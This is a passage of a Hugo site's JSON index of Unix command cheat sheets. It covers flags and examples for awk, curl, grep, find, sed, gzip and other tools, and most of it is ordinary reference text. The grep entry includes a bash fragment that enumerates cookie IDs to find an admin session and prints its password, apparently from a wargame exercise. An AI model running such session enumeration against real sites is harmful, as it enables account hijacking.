however, this is option is the last one processed. This should be used with #! scripts, particularly for CGI applications, to avoid passing in options or source code (!) on the command line from a URL. This option disables command-line variable assignments. -W gen-po --gen-po Scan and parse the AWK program, and generate a GNU .po format file on standard output with entries for all localizable strings in the program. The program itself is not executed. See the GNU gettext distribution for more information on .po files. -W help -W usage --help --usage Print a relatively short summary of the available options on the standard output. (Per the GNU Coding Standards, these options cause an immediate, successful exit.) -W lint[=value] --lint[=value] Provide warnings about constructs that are dubious or non-portable to other AWK implementations. With an optional argument of fatal, lint warnings become fatal errors. This may be drastic, but its use will certainly encourage the development of cleaner AWK programs. With an optional argument of invalid, only warnings about things that are actually invalid are issued. (This is not fully implemented yet.) -W lint-old --lint-old Provide warnings about constructs that are not portable to the original version of Unix awk. -W non-decimal-data --non-decimal-data Recognize octal and hexadecimal values in input data. Use this option with great caution! -W posix --posix This turns on compatibility mode, with the following additional restrictions: - \\x escape sequences are not recognized. - Only space and tab act as field separators when FS is set to a single space, newline does not. - You cannot continue lines after ? and :. - The synonym func for the keyword function is not recognized. - The operators ** and **= cannot be used in place of ^ and ^=. - The fflush() function is not available. -W profile[=prof_file] --profile[=prof_file] Send profiling data to prof_file. The default is awkprof.out. When run with gawk, the profile is just a \u0026quot;pretty printed\u0026quot; version of the program. When run with pgawk, the profile contains execution counts of each statement in the program in the left margin and function call counts for each user-defined function. -W re-interval --re-interval Enable the use of interval expressions in regular expression matching (see Regular Expressions, below). Interval expressions were not traditionally available in the AWK language. The POSIX standard added them, to make awk and egrep consistent with each other. However, their use is likely to break old AWK programs, so gawk only provides them if they are requested with this option, or when --posix is specified. -W source program-text --source program-text Use program-text as AWK program source code. This option allows the easy intermixing of library functions (used via the -f and --file options) with source code entered on the command line. It is intended primarily for medium to large AWK programs used in shell scripts. -W use-lc-numeric --use-lc-numeric This forces gawk to use the locales decimal point character when parsing input data. Although the POSIX standard requires this behavior, and gawk does so when --posix is in effect, the default is to follow traditional behavior and use a period as the decimal point, even in locales where the period is not the decimal point character. This option overrides the default behavior, without the full draconian strictness of the --posix option. -W version --version Print version information for this particular copy of gawk on the standard output. This is useful mainly for knowing if the current copy of gawk on your system is up to date with respect to whatever the Free Software Foundation is distributing. This is also useful when reporting bugs. (Per the GNU Coding Standards, these options cause an immediate, successful exit.)  Examples Print N columns from all rows Print the first column from all rows:\nawk '{print $1}'  Print the first and third columns from all rows:\nawk '{print $1, $3}'  The comma between the column parameters in the previous command will put a space between the outputted columns. However, you can change this behavior and use your own formatting:\nawk '{print $1 \u0026quot; --- \u0026quot; $3}'  Change the field delimiter and print the second column By default, awk will parse a row into columns using a space as the delimiter. The delimiter can be changed with the -F command line switch.\nFor example, change the delimiter to a semicolon:\nawk -F: '{print $2}'  The field delimiter could be anything such as an equal sign, -F=, or a period, -F..\nPrint the last column from all rows There are plenty of situations where you might need to print the last column from a given row, but you do not know how many columns are on that given row. The built-in variable NF can be used to solve this.\nawk '{print $NF}'  Print the last column from the first row Another built-in variable is NR which always contains the current row number. This can be used to do such things as printing the last column from only the first row:\nawk 'NR==1 {print $NF}'  Print the first column from all rows matching a regular expression If you want to print particular columns only from rows that match certain conditions, you can pass a regular expression:\nawk '/regular-expression-to-match/ {print $1}'  Print the first column from all rows except rows matching a regular expression You can also invert your regular expression match by putting an exclamation mark outside of the search field:\nawk '!/regular-expression-to-match/ {print $1}'  Also see  awk commands cheatsheet  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/curl/",
	"title": "curl",
	"tags": ["Unix Commands"],
	"description": "transfer a URL.",
	"content": "curl Usage curl OPTIONS URL  Flags write to file -o \u0026lt;file\u0026gt; --output \u0026lt;file\u0026gt;  Authentication https://devhints.io/curl -u \u0026lt;user\u0026gt;:\u0026lt;pass\u0026gt; --user \u0026lt;user\u0026gt;:\u0026lt;pass\u0026gt;  Verbose -v --verbose  Very Verbose -vv  Silent -s --silent  Headers only -I --head  Request -X POST --request POST  follow link if page redirects -L  Data HTTP post data, URL encoded (eg, status=\u0026quot;Hello\u0026rdquo;)\n-d 'data' --data 'data'  data via file -d @file --data @file  send data via GET -G --get  Headers user-agent -A \u0026lt;str\u0026gt; --user-agent \u0026lt;str\u0026gt;  cookie -b name=val --cookie name=val  cookie via file -b FILE --cookie FILE  Custom header -H \u0026quot;X-Foo: y\u0026quot; --header \u0026quot;X-Foo: y\u0026quot;  Use deflate/gzip --compressed  SSL/TLS --cacert \u0026lt;file\u0026gt; --capath \u0026lt;dir\u0026gt;  Client cert file -E \u0026lt;cert\u0026gt; --cert \u0026lt;cert\u0026gt;  Cert type --cert-type \u0026lt;der/pem/eng\u0026gt;  Ignore SSL -k --insecure  Examples Post data curl -d password=x http://x.com/y  Auth/data curl -u user:pass -d status=\u0026quot;Hello\u0026quot; http://twitter.com/statuses/update.xml  multipart file upload curl -v -include --form key1=value1 --form upload=@localfilename URL  Also see  DevHints  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/cut/",
	"title": "cut",
	"tags": ["Unix Commands"],
	"description": "remove sections from each line of files.",
	"content": "cut Usage cut OPTION FILE  Flags -b, --bytes=LIST select only these bytes -c, --characters=LIST select only these characters -d, --delimiter=DELIM use DELIM instead of TAB for field delimiter -f, --fields=LIST select only these fields; also print any line that contains no delimiter character, unless the -s option is specified -n with -b: dont split multibyte characters --complement complement the set of selected bytes, characters or fields -s, --only-delimited do not print lines not containing delimiters --output-delimiter=STRING use STRING as the output delimiter the default is to use the input delimiter --help display this help and exit --version output version information and exit Use one, and only one of -b, -c or -f. Each LIST is made up of one range, or many ranges separated by commas. Selected input is written in the same order that it is read, and is written exactly once. Each range is one of: N N th byte, character or field, counted from 1 N- from N th byte, character or field, to end of line N-M from N th to M th (included) byte, character or field -M from first to M th (included) byte, character or field With no FILE, or when FILE is -, read standard input.  Examples echo \u0026quot;a string\u0026quot; | cut -d \u0026quot; \u0026quot; -f 1 a  echo \u0026quot;a string\u0026quot; | cut -d \u0026quot; \u0026quot; -f 2 string  echo \u0026quot;a string\u0026quot; | cut -d \u0026quot; \u0026quot; -f 3  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/file/",
	"title": "file",
	"tags": ["Unix Commands"],
	"description": "determine file type.",
	"content": "file Usage FILE OPTIONS file  Flags -b, --brief Do not prepend filenames to output lines (brief mode). -C, --compile Write a magic.mgc output file that contains a pre-parsed version of the magic file or directory. -c, --checking-printout Cause a checking printout of the parsed form of the magic file. This is usually used in conjunction with the -m flag to debug a new magic file before installing it. -e, --exclude testname Exclude the test named in testname from the list of tests made to determine the file type. Valid test names are: apptype EMX application type (only on EMX). text Various types of text files (this test will try to guess the text encoding, irrespective of the setting of the encoding option). encoding Different text encodings for soft magic tests. tokens Looks for known tokens inside text files. cdf Prints details of Compound Document Files. compress Checks for, and looks inside, compressed files. elf Prints ELF file details. soft Consults magic files. tar Examines tar files. -F, --separator separator Use the specified string as the separator between the filename and the file result returned. Defaults to ':'. -f, --files-from namefile Read the names of the files to be examined from namefile (one per line) before the argument list. Either namefile or at least one filename argument must be present; to test the standard input, use '-' as a filename argument. -h, --no-dereference option causes symlinks not to be followed (on systems that support symbolic links). This is the default if the environment variable POSIXLY_CORRECT is not defined. -i, --mime Causes the file command to output mime type strings rather than the more traditional human readable ones. Thus it may say 'text/plain; charset=us-ascii' rather than 'ASCII text'. In order for this option to work, file changes the way it handles files recognized by the command itself (such as many of the text file types, directories etc), and makes use of an alternative 'magic' file. (See the FILES section, below). --mime-type, --mime-encoding Like -i, but print only the specified element(s). -k, --keep-going Dont stop at the first match, keep going. Subsequent matches will be have the string '\\012- ' prepended. (If you want a newline, see the '-r' option.) -L, --dereference option causes symlinks to be followed, as the like-named option in ls(1) (on systems that support symbolic links). This is the default if the environment variable POSIXLY_CORRECT is defined. -m, --magic-file magicfiles Specify an alternate list of files and directories containing magic. This can be a single item, or a colon-separated list. If a compiled magic file is found alongside a file or directory, it will be used instead. -N, --no-pad Dont pad filenames so that they align in the output. -n, --no-buffer Force stdout to be flushed after checking each file. This is only useful if checking a list of files. It is intended to be used by programs that want filetype output from a pipe. -p, --preserve-date On systems that support utime(2) or utimes(2), attempt to preserve the access time of files analyzed, to pretend that file never read them. -r, --raw Dont translate unprintable characters to \\ooo. Normally file translates unprintable characters to their octal representation. -s, --special-files Normally, file only attempts to read and determine the type of argument files which stat(2) reports are ordinary files. This prevents problems, because reading special files may have peculiar consequences. Specifying the -s option causes file to also read argument files which are block or character special files. This is useful for determining the filesystem types of the data in raw disk partitions, which are block special files. This option also causes file to disregard the file size as reported by stat(2) since on some systems it reports a zero size for raw disk partitions. -v, --version Print the version of the program and exit. -z, --uncompress Try to look inside compressed files. -0, --print0 Output a null character '\\0' after the end of the filename. Nice to cut(1) the output. This does not affect the separator which is still printed. --help Print a help message and exit.  Examples show file type file file1  show types for all files in directory file *  change the delimiter file -F - *  show mime-types file -i file1  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/find/",
	"title": "find",
	"tags": ["Unix Commands"],
	"description": "search for files in a directory hierarchy.",
	"content": "find Usage find PATH CONDITIONS ACTIONS  Conditions search for things that contain \u0026lsquo;.c\u0026rsquo; -name \u0026quot;*.c\u0026quot;  search for things owned by user \u0026lsquo;jonathan\u0026rsquo; -user jonathan  search for things with no user that corresponds to file\u0026rsquo;s numeric user ID -nouser  Search for specific type search for things that are files\n-type f  search for things that are directories\n-type d  search for things that are symlinks\n-type l  search only 2 folders deep -maxdepth 2  search with a regex pattern -regex PATTERN  search for specific file sizes Exactly 8 512-bit blocks\n-size 8  Smaller than 128 bytes\n-size -128c  Exactly 1440KiB\n-size 1440k  Larger than 10MiB\n-size +10M  Larger than 2GiB\n-size +2G  search for files modified more recently then file.txt -newer file.txt  modified newer than file.txt\n-newerm file.txt  change, modified, Bcreate\n-newerX file.txt  timestamp\n-newerXt \u0026quot;1 hour ago\u0026quot;  Actions execute rm on found items\n-exec rm {} \\;  print found items\n-print  delete found items\n-delete  Examples Find all files ending in \u0026lsquo;.jpg\u0026rsquo; and remove them find . -name '*.jpg' -exec rm {} \\;  Find all files created 24 hours ago find . -newerBt \u0026quot;24 hours ago\u0026quot;  Specific command 1 In the current folder, find files that are readable, executable have a size of 1033 bytes, then send the files found over to cat.\nfind . -type f -readable ! -executable -size 1033c -exec cat {} \\;  Specific command 2 In the current folder, find everything that has a size of 33 bytes, is owned by group bandit6 and user bandit7, redirect errors to /dev/null and send the stuff found over to cat.\nfind . -size 33c -group bandit6 -user bandit7 2\u0026gt; /dev/null -exec cat {} \\;  Also see  DevHints  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/grep/",
	"title": "grep",
	"tags": ["Unix Commands"],
	"description": "print lines matching a pattern.",
	"content": "grep Usage grep OPTIONS PATTERN FILE  Flags Generic Program Information --help Print a usage message briefly summarizing these command-line options and the bug-reporting address, then exit. -V, --version Print the version number of grep to the standard output stream. This version number should be included in all bug reports (see below). Matcher Selection -E, --extended-regexp Interpret PATTERN as an extended regular expression (ERE, see below). (-E is specified by POSIX .) -F, --fixed-strings Interpret PATTERN as a list of fixed strings, separated by newlines, any of which is to be matched. (-F is specified by POSIX .) -G, --basic-regexp Interpret PATTERN as a basic regular expression (BRE, see below). This is the default. -P, --perl-regexp Interpret PATTERN as a Perl regular expression. This is highly experimental and grep -P may warn of unimplemented features. Matching Control -e PATTERN, --regexp=PATTERN Use PATTERN as the pattern. This can be used to specify multiple search patterns, or to protect a pattern beginning with a hyphen (-). (-e is specified by POSIX .) -f FILE, --file=FILE Obtain patterns from FILE, one per line. The empty file contains zero patterns, and therefore matches nothing. (-f is specified by POSIX .) -i, --ignore-case Ignore case distinctions in both the PATTERN and the input files. (-i is specified by POSIX .) -v, --invert-match Invert the sense of matching, to select non-matching lines. (-v is specified by POSIX .) -w, --word-regexp Select only those lines containing matches that form whole words. The test is that the matching substring must either be at the beginning of the line, or preceded by a non-word constituent character. Similarly, it must be either at the end of the line or followed by a non-word constituent character. Word-constituent characters are letters, digits, and the underscore. -x, --line-regexp Select only those matches that exactly match the whole line. (-x is specified by POSIX .) -y Obsolete synonym for -i. General Output Control -c, --count Suppress normal output; instead print a count of matching lines for each input file. With the -v, --invert-match option (see below), count non-matching lines. (-c is specified by POSIX .) --color[=WHEN], --colour[=WHEN] Surround the matched (non-empty) strings, matching lines, context lines, file names, line numbers, byte offsets, and separators (for fields and groups of context lines) with escape sequences to display them in color on the terminal. The colors are defined by the environment variable GREP_COLORS. The deprecated environment variable GREP_COLOR is still supported, but its setting does not have priority. WHEN is never, always, or auto. -L, --files-without-match Suppress normal output; instead print the name of each input file from which no output would normally have been printed. The scanning will stop on the first match. -l, --files-with-matches Suppress normal output; instead print the name of each input file from which output would normally have been printed. The scanning will stop on the first match. (-l is specified by POSIX .) -m NUM, --max-count=NUM Stop reading a file after NUM matching lines. If the input is standard input from a regular file, and NUM matching lines are output, grep ensures that the standard input is positioned to just after the last matching line before exiting, regardless of the presence of trailing context lines. This enables a calling process to resume a search. When grep stops after NUM matching lines, it outputs any trailing context lines. When the -c or --count option is also used, grep does not output a count greater than NUM. When the -v or --invert-match option is also used, grep stops after outputting NUM non-matching lines. -o, --only-matching Print only the matched (non-empty) parts of a matching line, with each such part on a separate output line. -q, --quiet, --silent Quiet; do not write anything to standard output. Exit immediately with zero status if any match is found, even if an error was detected. Also see the -s or --no-messages option. (-q is specified by POSIX .) -s, --no-messages Suppress error messages about nonexistent or unreadable files. Portability note: unlike GNU grep, 7th Edition Unix grep did not conform to POSIX , because it lacked -q and its -s option behaved like GNU greps -q option. USG -style grep also lacked -q but its -s option behaved like GNU grep. Portable shell scripts should avoid both -q and -s and should redirect standard and error output to /dev/null instead. (-s is specified by POSIX .) Output Line Prefix Control -b, --byte-offset Print the 0-based byte offset within the input file before each line of output. If -o (--only-matching) is specified, print the offset of the matching part itself. -H, --with-filename Print the file name for each match. This is the default when there is more than one file to search. -h, --no-filename Suppress the prefixing of file names on output. This is the default when there is only one file (or only standard input) to search. --label=LABEL Display input actually coming from standard input as input coming from file LABEL. This is especially useful when implementing tools like zgrep, e.g., gzip -cd foo.gz | grep --label=foo -H something. See also the -H option. -n, --line-number Prefix each line of output with the 1-based line number within its input file. (-n is specified by POSIX .) -T, --initial-tab Make sure that the first character of actual line content lies on a tab stop, so that the alignment of tabs looks normal. This is useful with options that prefix their output to the actual content: -H,-n, and -b. In order to improve the probability that lines from a single file will all start at the same column, this also causes the line number and byte offset (if present) to be printed in a minimum size field width. -u, --unix-byte-offsets Report Unix-style byte offsets. This switch causes grep to report byte offsets as if the file were a Unix-style text file, i.e., with CR characters stripped off. This will produce results identical to running grep on a Unix machine. This option has no effect unless -b option is also used; it has no effect on platforms other than MS-DOS and MS -Windows. -Z, --null Output a zero byte (the ASCII NUL character) instead of the character that normally follows a file name. For example, grep -lZ outputs a zero byte after each file name instead of the usual newline. This option makes the output unambiguous, even in the presence of file names containing unusual characters like newlines. This option can be used with commands like find -print0, perl -0, sort -z, and xargs -0 to process arbitrary file names, even those that contain newline characters. Context Line Control -A NUM, --after-context=NUM Print NUM lines of trailing context after matching lines. Places a line containing a group separator (--) between contiguous groups of matches. With the -o or --only-matching option, this has no effect and a warning is given. -B NUM, --before-context=NUM Print NUM lines of leading context before matching lines. Places a line containing a group separator (--) between contiguous groups of matches. With the -o or --only-matching option, this has no effect and a warning is given. -C NUM, -NUM, --context=NUM Print NUM lines of output context. Places a line containing a group separator (--) between contiguous groups of matches. With the -o or --only-matching option, this has no effect and a warning is given. File and Directory Selection -a, --text Process a binary file as if it were text; this is equivalent to the --binary-files=text option. --binary-files=TYPE If the first few bytes of a file indicate that the file contains binary data, assume that the file is of type TYPE. By default, TYPE is binary, and grep normally outputs either a one-line message saying that a binary file matches, or no message if there is no match. If TYPE is without-match, grep assumes that a binary file does not match; this is equivalent to the -I option. If TYPE is text, grep processes a binary file as if it were text; this is equivalent to the -a option. Warning: grep --binary-files=text might output binary garbage, which can have nasty side effects if the output is a terminal and if the terminal driver interprets some of it as commands. -D ACTION, --devices=ACTION If an input file is a device, FIFO or socket, use ACTION to process it. By default, ACTION is read, which means that devices are read just as if they were ordinary files. If ACTION is skip, devices are silently skipped. -d ACTION, --directories=ACTION If an input file is a directory, use ACTION to process it. By default, ACTION is read, which means that directories are read just as if they were ordinary files. If ACTION is skip, directories are silently skipped. If ACTION is recurse, grep reads all files under each directory, recursively; this is equivalent to the -r option. --exclude=GLOB Skip files whose base name matches GLOB (using wildcard matching). A file-name glob can use *, ?, and [...] as wildcards, and \\ to quote a wildcard or backslash character literally. --exclude-from=FILE Skip files whose base name matches any of the file-name globs read from FILE (using wildcard matching as described under --exclude). --exclude-dir=DIR Exclude directories matching the pattern DIR from recursive searches. -I Process a binary file as if it did not contain matching data; this is equivalent to the --binary-files=without-match option. --include=GLOB Search only files whose base name matches GLOB (using wildcard matching as described under --exclude). -R, -r, --recursive Read all files under each directory, recursively; this is equivalent to the -d recurse option. Other Options --line-buffered Use line buffering on output. This can cause a performance penalty. --mmap If possible, use the mmap(2) system call to read input, instead of the default read(2) system call. In some situations, --mmap yields better performance. However, --mmap can cause undefined behavior (including core dumps) if an input file shrinks while grep is operating, or if an I/O error occurs. -U, --binary Treat the file(s) as binary. By default, under MS-DOS and MS -Windows, grep guesses the file type by looking at the contents of the first 32KB read from the file. If grep decides the file is a text file, it strips the CR characters from the original file contents (to make regular expressions with ^ and $ work correctly). Specifying -U overrules this guesswork, causing all files to be read and passed to the matching mechanism verbatim; if the file is a text file with CR/LF pairs at the end of each line, this will cause some regular expressions to fail. This option has no effect on platforms other than MS-DOS and MS -Windows. -z, --null-data Treat the input as a set of lines, each terminated by a zero byte (the ASCII NUL character) instead of a newline. Like the -Z or --null option, this option can be used with commands like sort -z to process arbitrary file names.  Examples Find a string Find the string somestring in data.txt\ngrep somestring data.txt  Regex find Find strings that start with 8 in data.txt\ngrep -E ^8.* data.txt  Quietly find Quietly grep something. Useful in bash scripts where you just want to check if its true.\ngrep -q somestring data.txt  Use quite in a bash script\nif echo $curl_output | grep -q \u0026quot;regular user\u0026quot;; then echo \u0026quot;[-] $CurrentID out of $MaxCookieID is not a admin session.\u0026quot; else echo \u0026quot;[+] $CurrentID out of $MaxCookieID is a admin session.\u0026quot; echo \u0026quot;$(echo $curl_output | grep Password)\u0026quot; break fi  Negative grep Negative grep. Find something that does not equal somestring.\ngrep -v somestring data.txt  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/gzip-gunzip-zcat/",
	"title": "gzip gunzip zcat",
	"tags": ["Unix Commands"],
	"description": "compress or expand files.",
	"content": "gzip gunzip zcat Usage gzip OPTIONS FILE gunzip OPTIONS FILE  Flags -a --ascii Ascii text mode: convert end-of-lines using local conventions. This option is supported only on some non-Unix systems. For MSDOS, CR LF is converted to LF when compressing, and LF is converted to CR LF when decompressing -c --stdout --to-stdout Write output on standard output; keep original files unchanged. If there are several input files, the output consists of a sequence of independently compressed members. To obtain better compression, concatenate all input files before compressing them. -d --decompress --uncompress Decompress. -f --force Force compression or decompression even if the file has multiple links or the corresponding file already exists, or if the compressed data is read from or written to a terminal. If the input data is not in a format recognized by gzip, and if the option --stdout is also given, copy the input data without change to the standard output: let zcat behave as cat. If -f is not given, and when not running in the background, gzip prompts to verify whether an existing file should be overwritten. -h --help Display a help screen and quit. -l --list For each compressed file, list the following fields: compressed size: size of the compressed file uncompressed size: size of the uncompressed file ratio: compression ratio (0.0% if unknown) uncompressed_name: name of the uncompressed file The uncompressed size is given as -1 for files not in gzip format, such as compressed .Z files. To get the uncompressed size for such a file, you can use: zcat file.Z | wc -c In combination with the --verbose option, the following fields are also displayed: method: compression method crc: the 32-bit CRC of the uncompressed data date \u0026amp; time: time stamp for the uncompressed file The compression methods currently supported are deflate, compress, lzh (SCO compress -H) and pack. The crc is given as ffffffff for a file not in gzip format. With --name, the uncompressed name, date and time are those stored within the compress file if present. With --verbose, the size totals and compression ratio for all files is also displayed, unless some sizes are unknown. With --quiet, the title and totals lines are not displayed. -L --license Display the gzip license and quit. -n --no-name When compressing, do not save the original file name and time stamp by default. (The original name is always saved if the name had to be truncated.) When decompressing, do not restore the original file name if present (remove only the gzip suffix from the compressed file name) and do not restore the original time stamp if present (copy it from the compressed file). This option is the default when decompressing. -N --name When compressing, always save the original file name and time stamp; this is the default. When decompressing, restore the original file name and time stamp if present. This option is useful on systems which have a limit on file name length or when the time stamp has been lost after a file transfer. -q --quiet Suppress all warnings. -r --recursive Travel the directory structure recursively. If any of the file names specified on the command line are directories, gzip will descend into the directory and compress all the files it finds there (or decompress them in the case of gunzip ). -S .suf --suffix .suf When compressing, use suffix .suf instead of .gz. Any non-empty suffix can be given, but suffixes other than .z and .gz should be avoided to avoid confusion when files are transferred to other systems. When decompressing, add .suf to the beginning of the list of suffixes to try, when deriving an output file name from an input file name. pack(1). -t --test Test. Check the compressed file integrity. -v --verbose Verbose. Display the name and percentage reduction for each file compressed or decompressed. -V --version Version. Display the version number and compilation options then quit. -# --fast --best Regulate the speed of compression using the specified digit '#', where -1 or --fast indicates the fastest compression method (less compression) and -9 or --best indicates the slowest compression method (best compression). The default compression level is -6 (that is, biased towards high compression at expense of speed).  Examples compress a file gzip file1  keep uncompressed file gzip -k file1  decompress a file gzip -d file.gz  recursive compress gzip -r folder1  compression level gzip -1 file1 gzip -9 file1  uncompress archives gunzip file1.gz  keep archive file gunzip -c file1.gz \u0026gt; file1  define output folder gunzip -c file1.gz \u0026gt; /home/justin-p/file1  show contents of gzip zcat file1.gz  show properties of file1 zcat -l file1.gz  suppress warnings zcat -q file.gz  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/rev/",
	"title": "rev",
	"tags": ["Unix Commands"],
	"description": "reverse lines characterwise.",
	"content": "rev Usage rev OPTIONS FILE  Flags -V, --version Display version information and exit. -h, --help Display help text and exit.  Examples reverse a string echo 'string' | rev  reverse a file rev file1  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/sed/",
	"title": "sed",
	"tags": ["Unix Commands"],
	"description": "stream editor for filtering and transforming text.",
	"content": "sed Usage sed OPTIONS FILE  Flags -n, --quiet, --silent suppress automatic printing of pattern space --debug annotate program execution -e script, --expression=script add the script to the commands to be executed -f script-file, --file=script-file add the contents of script-file to the commands to be executed --follow-symlinks follow symlinks when processing in place -i[SUFFIX], --in-place[=SUFFIX] edit files in place (makes backup if SUFFIX supplied) -l N, --line-length=N specify the desired line-wrap length for the 'l' command --posix disable all GNU extensions. -E, -r, --regexp-extended use extended regular expressions in the script (for portability use POSIX -E). -s, --separate consider files as separate rather than as a single, continuous long stream. --sandbox operate in sandbox mode (disable e/r/w commands). -u, --unbuffered load minimal amounts of data from the input files and flush the output buffers more often -z, --null-data separate lines by NUL characters --help display this help and exit --version output version information and exit  Examples Printing lines Print all with \u0026ldquo;abc\u0026rdquo;\n/abc/p  Print all without \u0026ldquo;abc\u0026rdquo;\n/abc/!p  Deleting Delete all with \u0026ldquo;abc\u0026rdquo;\n/abc/d  Delete all without \u0026ldquo;abc\u0026rdquo;\n/abc/!d  Select a block /start/,/end/!d  Conditional replace /abc/{s/def/ghi)}  Appending lines Append \u0026lsquo;Hallo\u0026rsquo; after each line\naHallo  Append \u0026lsquo;Hallo\u0026rsquo; after line #5\n5 aHallo  Append \u0026lsquo;Hallo\u0026rsquo; to end of file\n$ aHallo  Pre-pending lines sed -i '1s;^;new line 1\\nanother new line 2\\n;' \u0026lt;file\u0026gt;  In-place Editing To edit file use the -i option this safely changes the file contents without any output redirection needed.\nsed -i 's/abc/ABC/' myfile.txt sed -i '/deleteme/d' *  Drop grep Often grep and sed are used together. In all those cases grep can be dropped. For example\ngrep \u0026quot;pattern\u0026quot; file | sed \u0026quot;s/abc/def/\u0026quot;  can be written as\nsed -n \u0026quot;/pattern/p; s/abc/def/\u0026quot;  Grouping with sed Always use single quotes!\nsed 's/^.*\\(pattern\\).*/\\1/'  Single Quoting Single Quotes If you want to do extraction and need a pattern based on single quotes use \\x27 instead of trying to insert a single quote. For example:\nsed 's/.*var=\\x27\\([^\\x27]*\\)\\x27.*/\\1/'  to extract \u0026ldquo;some string\u0026rdquo; from \u0026ldquo;var='some string\u0026rsquo;\u0026rdquo;. Or if you don\u0026rsquo;t know about the quoting, but know there are quotes\nsed 's/.*var=.\\([^\u0026quot;\\x27]*\\)..*/\\1/'  Conditional Replace with sed sed '/conditional pattern/{s/pattern/replacement/g}'  Prefix files with a boilerplate using sed sed -i '1s/^/# DO NOT TOUCH THIS FILE!\\n\\n/' *  Removing Newlines with sed The only way to remove new line is this:\nsed ':a;N;$!ba;s/\\n//g' file  Selecting Blocks sed '/first line/,/last line/!d' file  See Also  sed CheatSheet  "
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/sort/",
	"title": "sort",
	"tags": ["Unix Commands"],
	"description": "sort lines of text files.",
	"content": "sort Usage sort OPTIONS FILE  Flags -b, --ignore-leading-blanks ignore leading blanks -d, --dictionary-order consider only blanks and alphanumeric characters -f, --ignore-case fold lower case to upper case characters -g, --general-numeric-sort compare according to general numerical value -i, --ignore-nonprinting consider only printable characters -M, --month-sort compare (unknown) \u0026lt; 'JAN' \u0026lt; ... \u0026lt; 'DEC' -h, --human-numeric-sort compare human readable numbers (e.g., 2K 1G) -n, --numeric-sort compare according to string numerical value -R, --random-sort shuffle, but group identical keys. See shuf(1) --random-source=FILE get random bytes from FILE -r, --reverse reverse the result of comparisons --sort=WORD sort according to WORD: general-numeric -g, human-numeric -h, month -M, numeric -n, random -R, version -V -V, --version-sort natural sort of (version) numbers within text Other options: --batch-size=NMERGE merge at most NMERGE inputs at once; for more use temp files -c, --check, --check=diagnose-first check for sorted input; do not sort -C, --check=quiet, --check=silent like -c, but do not report first bad line --compress-program=PROG compress temporaries with PROG; decompress them with PROG -d --debug annotate the part of the line used to sort, and warn about questionable usage to stderr --files0-from=F read input from the files specified by NUL-terminated names in file F; If F is - then read names from standard input -k, --key=KEYDEF sort via a key; KEYDEF gives location and type -m, --merge merge already sorted files; do not sort -o, --output=FILE write result to FILE instead of standard output -s, --stable stabilize sort by disabling last-resort comparison -S, --buffer-size=SIZE use SIZE for main memory buffer -t, --field-separator=SEP use SEP instead of non-blank to blank transition -T, --temporary-directory=DIR use DIR for temporaries, not $TMPDIR or /tmp; multiple options specify multiple directories --parallel=N change the number of sorts run concurrently to N -u, --unique with -c, check for strict ordering; without -c, output only the first of an equal run -z, --zero-terminated line delimiter is NUL, not newline --help display this help and exit --version output version information and exit  Examples sort by 5th column ls -al | sort -n -k5  sort numerically by column two ps auxw | sort -nk2  reverse sort numerically by column two ps auxw | sort -rnk2  sort a file contents to file sort file1 \u0026gt; file1.sorted  scramble instead of sort sort -R file1 sort -R  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/strings/",
	"title": "strings",
	"tags": ["Unix Commands"],
	"description": "strings description.",
	"content": "strings Usage strings OPTIONS FILE  Flags -a --all - Do not scan only the initialized and loaded sections of object files; scan the whole files. -f --print-file-name Print the name of the file before each string. --help Print a summary of the program usage on the standard output and exit. -min-len -n min-len --bytes=min-len Print sequences of characters that are at least min-len characters long, instead of the default 4. -o Like -t o. Some other versions of strings have -o act like -t d instead. Since we can not be compatible with both ways, we simply chose one. -t radix --radix=radix Print the offset within the file before each string. The single character argument specifies the radix of the offset---o for octal, x for hexadecimal, or d for decimal. -e encoding --encoding=encoding Select the character encoding of the strings that are to be found. Possible values for encoding are: s = single-7-bit-byte characters ( ASCII , ISO 8859, etc., default), S = single-8-bit-byte characters, b = 16-bit bigendian, l = 16-bit littleendian, B = 32-bit bigendian, L = 32-bit littleendian. Useful for finding wide character strings. (l and b apply to, for example, Unicode UTF-16/UCS-2 encodings). -T bfdname --target=bfdname Specify an object code format other than your systems default format. -v -V --version Print the program version number on the standard output and exit. @file Read command-line options from file. The options read are inserted in place of the original @file option. If file does not exist, or cannot be read, then the option will be treated literally, and not removed. Options in file are separated by whitespace. A whitespace character may be included in an option by surrounding the entire option in either single or double quotes. Any character (including a backslash) may be included by prefixing the character to be included with a backslash. The file may itself contain additional @file options; any such options will be processed recursively.  Examples cat data.bin | strings  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/touch/",
	"title": "touch",
	"tags": ["Unix Commands"],
	"description": "change file timestamps.",
	"content": "touch Usage touch OPTION FILE  Flags -a change only the access time -c, --no-create do not create any files -d, --date=STRING parse STRING and use it instead of current time -f (ignored) -h, --no-dereference affect each symbolic link instead of any referenced file (useful only on systems that can change the timestamps of a symlink) -m change only the modification time -r, --reference=FILE use this files times instead of current time -t STAMP use [[CC]YY]MMDDhhmm[.ss] instead of current time --time=WORD change the specified time: WORD is access, atime, or use: equivalent to -a WORD is modify or mtime: equivalent to -m --help display this help and exit --version output version information and exit  Examples create a empty file touch file1  update timestamp and modification touch -am file  use timestamp of file4 on file 5 touch -r file4 file5  make file7 30 seconds older than file6 touch -r file6 -B 30 file7  set timestamp to specific timestamp touch -d '1 May 2005 10:22' file8 touch -d '14 May' file9 touch -d '14:24' file9  avoid creating new file touch -c file10  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/tr/",
	"title": "tr",
	"tags": ["Unix Commands"],
	"description": "translate or delete characters.",
